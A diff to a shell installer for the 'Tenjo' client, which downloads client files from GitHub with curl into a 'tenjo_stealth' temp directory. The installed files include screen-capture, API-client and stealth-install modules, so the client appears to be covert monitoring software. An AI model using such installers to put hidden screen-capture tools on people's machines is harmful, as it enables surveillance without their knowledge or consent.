@@ -45,7 +45,65 @@ chmod 755 "$INSTALL_DIR"
 
 # Copy application files
 log "${BLUE}📦 Installing application files...${NC}"
-cp -r . "$INSTALL_DIR/"
+
+# Create a temporary download if running from curl
+if [[ ! -f "main.py" ]]; then
+    # We're running from curl, need to download the client files
+    log "${BLUE}📥 Downloading Tenjo client files...${NC}"
+    
+    TEMP_DIR="/tmp/tenjo_stealth_$$"
+    mkdir -p "$TEMP_DIR"
+    cd "$TEMP_DIR"
+    
+    # Download client files from GitHub
+    curl -sSL "https://github.com/Adi-Sumardi/Tenjo/archive/refs/heads/master.zip" -o tenjo.zip
+    
+    if command -v unzip >/dev/null 2>&1; then
+        unzip -q tenjo.zip
+        cp -r Tenjo-master/client/* "$INSTALL_DIR/" 2>/dev/null || {
+            # Fallback: copy essential files only
+            mkdir -p "$INSTALL_DIR/src"
+            cp Tenjo-master/client/main.py "$INSTALL_DIR/" 2>/dev/null || true
+            cp -r Tenjo-master/client/src/* "$INSTALL_DIR/src/" 2>/dev/null || true
+            cp Tenjo-master/client/requirements*.txt "$INSTALL_DIR/" 2>/dev/null || true
+        }
+    else
+        log "${RED}❌ unzip not found, trying alternative method...${NC}"
+        # Alternative: download individual files
+        GITHUB_RAW="https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client"
+        curl -sSL "$GITHUB_RAW/main.py" -o "$INSTALL_DIR/main.py"
+        mkdir -p "$INSTALL_DIR/src/core" "$INSTALL_DIR/src/modules" "$INSTALL_DIR/src/utils"
+        
+        # Download essential files
+        curl -sSL "$GITHUB_RAW/src/core/config.py" -o "$INSTALL_DIR/src/core/config.py" 2>/dev/null || true
+        curl -sSL "$GITHUB_RAW/src/utils/api_client.py" -o "$INSTALL_DIR/src/utils/api_client.py" 2>/dev/null || true
+        curl -sSL "$GITHUB_RAW/src/modules/screen_capture.py" -o "$INSTALL_DIR/src/modules/screen_capture.py" 2>/dev/null || true
+        curl -sSL "$GITHUB_RAW/requirements.txt" -o "$INSTALL_DIR/requirements.txt" 2>/dev/null || true
+    fi
+    
+    # Cleanup
+    cd /
+    rm -rf "$TEMP_DIR"
+else
+    # We're in the client directory, copy selectively
+    log "${BLUE}📁 Copying from local directory...${NC}"
+    
+    # Copy essential files only, ignore problematic directories
+    cp main.py "$INSTALL_DIR/" 2>/dev/null || true
+    cp requirements*.txt "$INSTALL_DIR/" 2>/dev/null || true
+    cp -r src "$INSTALL_DIR/" 2>/dev/null || true
+    
+    # Copy optional files if they exist
+    cp service.py "$INSTALL_DIR/" 2>/dev/null || true
+    cp stealth_install.py "$INSTALL_DIR/" 2>/dev/null || true
+    cp tenjo_startup.py "$INSTALL_DIR/" 2>/dev/null || true
+    
+    # Create __init__.py files for Python modules
+    touch "$INSTALL_DIR/src/__init__.py"
+    touch "$INSTALL_DIR/src/core/__init__.py" 2>/dev/null || true
+    touch "$INSTALL_DIR/src/modules/__init__.py" 2>/dev/null || true
+    touch "$INSTALL_DIR/src/utils/__init__.py" 2>/dev/null || true
+fi
 
 # Install Python dependencies silently
 log "${BLUE}🐍 Installing Python dependencies...${NC}"
